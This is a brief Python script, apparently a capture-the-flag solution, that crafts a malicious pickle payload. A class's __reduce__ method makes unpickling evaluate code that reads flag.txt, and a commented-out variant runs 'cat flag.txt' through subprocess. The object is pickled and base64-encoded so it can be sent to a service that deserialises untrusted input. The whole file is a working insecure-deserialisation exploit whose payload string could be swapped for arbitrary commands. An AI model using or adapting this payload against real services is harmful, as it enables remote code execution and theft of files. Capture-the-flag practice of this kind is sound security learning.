import pickle
#import subprocess
import base64

#class CommandExecutor:
#    def __reduce__(self):
#        # This method is called when the object is unpickled
#        return (subprocess.call, (["cat", "flag.txt"],))

class CommandExecutor:
    def __reduce__(self):
        # This will execute: open('flag.txt').read()
        return (eval, ("open('flag.txt').read()",))

# Create an instance of the executor
executor = CommandExecutor()

# Serialize the object using pickle
pickled_object = pickle.dumps(executor)

# Encode the pickled object in base64
encoded_object = base64.b64encode(pickled_object)

# Print the base64-encoded pickle
print(encoded_object.decode())
